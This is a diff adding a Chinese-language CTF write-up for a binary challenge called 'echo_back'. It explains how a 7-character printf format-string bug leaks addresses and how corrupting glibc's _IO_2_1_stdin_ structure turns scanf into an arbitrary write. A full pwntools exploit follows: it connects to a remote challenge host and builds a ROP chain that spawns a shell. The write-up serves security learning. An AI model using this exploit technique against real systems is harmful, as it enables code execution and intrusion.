@@ -2371,3 +2371,166 @@ if __name__ == '__main__':
     io.sendlineafter('$ ', '/bin/sh')
     io.interactive()
 ```
+
+
+### 26. echo_back
+题目：暂无
+
+思路：这个题目的漏洞点还是比较明显的，就是存在一个printf格式化字符串漏洞，可以比较轻易泄露地址信息，但是难点在于这个可控的字符串存在7个字符的长度限制，不好直接利用漏洞修改返回地址，这里利用了修改_IO_2_1_stdin_结构，然后利用scanf实现任意地址写入的方法从而getshell。
+
+#### printf格式化字符串漏洞泄露信息
+由于这个题所有防护机制全开，因此如果需求修改返回地址并进行rop需要得到elf文件和libc的基址以及栈的地址，这里通过格式化字符串漏洞泄露相关信息。格式化字符串漏洞利用主要就是需要确定printf函数调用时的堆栈内容，一种是通过ida分析，另一种是在gdb中直接在printf那一行上下断点。栈帧如下：
+```
+rsp --> xx
+        name_addr
+        xx
+        x length
+        content
+        cookie
+    |---ebp
+    |   ret(main函数中的某个地址)
+    |   xx
+    |   xx
+    |   name
+    |   cookie
+    |--> ebp
+        ret(__lib_start_main中的某个地址)
+```
+由于64位传参首先使用前6个寄存器，第一个寄存器是format字符串，后面5个寄存器依次为format的前5个参数，从栈顶开始依次是第6、到第n个参数。为了泄露我们需要的信息，我们使用%12$p,%13$p,%19$p分别泄露main函数的栈帧（上面个ebp，将这个值+8得到main函数返回地址的地址）、第一个返回地址（用于计算elf的基址）、第二个返回地址（用于计算libc基址）。
+**如果加载的libc不是题目给定的libc会导致泄漏的地址有偏差。**
+
+#### printf格式化字符串漏洞写入
+格式化字符串漏洞向某个地址写入内容时还需要提供地址信息，如果直接写入肯定超过7个字符限制了，这里可以使用name写入地址信息节省字符串长度。但是由于长度限制，%16$hhn只能往name指向的地址中写入一个字节0.
+
+#### 修改_IO_2_1_stdin_结构实现scanf任意写入
+_IO_2_1_stdin_结构体：
+```c++
+struct _IO_FILE
+{
+    int _flags; /* High-order word is _IO_MAGIC; rest is flags. */
+
+    /* The following pointers correspond to the C++ streambuf protocol. */
+    char *_IO_read_ptr;  /* Current read pointer */
+    char *_IO_read_end;  /* End of get area. */
+    char *_IO_read_base; /* Start of putback+get area. */
+    char *_IO_write_base;/* Start of put area. */
+    char *_IO_write_ptr; /* Current put pointer. */
+    char *_IO_write_end; /* End of put area. */
+    char *_IO_buf_base;  /* Start of reserve area. */
+    char *_IO_buf_end;   /* End of reserve area. */
+    ...
+}
+```
+当程序调用scanf读取内容时会根据_IO_read_ptr和_IO_read_end从_IO_buf_base中读取内容，如果缓冲区都读完了会使用系统调用从标准输入中读取内容并写入到_IO_buf_base中并设置_IO_read_ptr和_IO_read_end。如果能够修改_IO_buf_base和_IO_buf_end就能实现任意地址写入了。这里修改_IO_2_1_stdin_结构体使用了格式化字符串漏洞，首先将_IO_buf_base的低字节修改为0。查看stdin结构在内存中的状态：
+```python
+pwndbg> x/20x stdin
+0x7ffff7dd18e0 <_IO_2_1_stdin_>:        0xfbad208b      0x00000000      0xf7dd1964      0x00007fff
+0x7ffff7dd18f0 <_IO_2_1_stdin_+16>:     0xf7dd1964      0x00007fff      0xf7dd1963      0x00007fff
+0x7ffff7dd1900 <_IO_2_1_stdin_+32>:     0xf7dd1963      0x00007fff      0xf7dd1963      0x00007fff
+0x7ffff7dd1910 <_IO_2_1_stdin_+48>:     0xf7dd1963      0x00007fff      0xf7dd1963      0x00007fff
+0x7ffff7dd1920 <_IO_2_1_stdin_+64>:     0xf7dd1964      0x00007fff      0x00000000      0x00000000
+```
+由于地址随机化不影响最低的一个字节，因此最低位在libc不变的情况下固定的，因此将_IO_buf_base的低字节修改为0后实际指向了_IO_write_base字段，由于_IO_buf_end没变，这时候scanf就可以输入很长的内容了。这时候调用scanf就可以修改新的_IO_buf_base指向的内存了，输入的内容首先要覆盖3个write字段（默认就是stdin的地址+0x83）,然后_IO_buf_base和_IO_buf_end为需要写入的内存地址范围，_IO_buf_end可以比较大。这里还有个问题就是scanf首先确实进行了系统调用并将内存写入到指定的位置了，但是由于这里是scanf("%d",&len),而输入的内容中并没有数字字符，因此_IO_read_ptr并没有移动，因此无法进行下一次系统调用写入新的数据了，这里存在一个利用条件就是scanf之后调用了一个getchar函数，将_IO_read_ptr指针+1，多次调用使得_IO_read_ptr==_IO_read_end之后会再次出发系统调用从而往我们需要的地址写入数据了。
+
+全部利用代码如下：
+```python
+from pwn import *
+
+debug = False
+if debug:
+    io = process('./echo_back')
+else:
+    io = remote('220.249.52.134', 51753)
+
+elf = ELF('echo_back')
+libc = ELF('libc.so.6')
+
+def echo(payload, length=b'100\n'):
+    data = io.sendlineafter('>> ', '2')
+    print('1',data)
+    data = io.sendafter(':', length)
+    print('2',data)
+    io.send(payload)
+    data = io.recvuntil('say:')
+    print('3',data)
+    data = io.recvuntil('----')
+    print('4',data)
+    return data[:-4]
+
+def set_name(name):
+    io.sendlineafter('>> ', '1')
+    io.sendafter(':', name)
+
+pop_rdi = 0xd93
+
+if __name__ == '__main__':
+    # leak libc addr
+    payload = b'%19$p'
+    data = echo(payload)
+    libc_start_main = int(data[2:], 16) - 240
+    libc_addr = libc_start_main - libc.sym['__libc_start_main']
+    log.success('libc addr: 0x%x' % libc_addr)
+
+    system_addr = libc_addr + libc.sym['system']
+    binsh_addr = libc_addr + next(libc.search(b'/bin/sh\x00'))
+    log.success('system addr: 0x%x' % system_addr)
+    log.success('binsh addr: 0x%x' % binsh_addr)
+
+    # leak main ebp
+    payload = b'%12$p'
+    data = echo(payload)
+    main_ebp = int(data[2:], 16)
+    main_ret_addr = main_ebp + 8
+    log.success('main ret addr: 0x%x' % main_ret_addr)
+
+    # leak main addr
+    payload = b'%13$p'
+    data = echo(payload)
+    main_addr = int(data[2:], 16)
+    log.success('main addr: 0x%x' % main_addr)
+    elf_base = main_addr - 0xd08
+    log.success('elf base: 0x%x' % elf_base)
+    # gdb.attach(io)
+    # pause()
+
+    # modify _IO_2_1_stdin_ io_buf_base0 low byte to 00(_io_buf_base1)
+    stdin = libc.sym['_IO_2_1_stdin_'] + libc_addr
+    stdin_buf_base = stdin + 0x8 * 7
+    set_name(p64(stdin_buf_base))
+    payload = b'%16$hhn'
+    # gdb.attach(io)
+    # pause()
+    echo(payload)
+    # now stdin_buf_base = stdin + 0x20
+
+    # using scanf to  modify stdin
+    # _io_write_base, _io_write_ptr, _io_write_end, _io_buf_base2, _io_buf_end
+    length = p64(stdin+0x83)*3+p64(main_ret_addr)+p64(main_ret_addr+48)
+    echo('a', length)
+    # gdb.attach(io)
+    # pause()
+    # now _io_buf_base2 -> main_ret_addr
+    # _io_read_ptr = _io_buf_base1 + 1
+    # _io_read_ptr + 1 because of getchar()
+    # _io_read_end = _io_buf_base1 + len(length)
+
+    # using getchar to make _io_read_ptr = _io_read_end
+    for i in range(len(length) - 1):
+        print(i)
+        echo('xx', 'xx')
+    # gdb.attach(io)
+    # pause()
+
+    # scanf will trigger read stdin
+    # length = p64(0x45216 + libc_addr)
+    log.success('one_gadget addr: 0x%x' % (0x45216 + libc_addr))
+    # length = p64(0x45216 + libc_addr)
+    length = p64(pop_rdi + elf_base) + p64(binsh_addr) + p64(system_addr)
+    echo('a', length)
+    # gdb.attach(io)
+    # pause()
+
+    # exit
+    io.sendlineafter('>> ', '3')
+    io.interactive()
+```
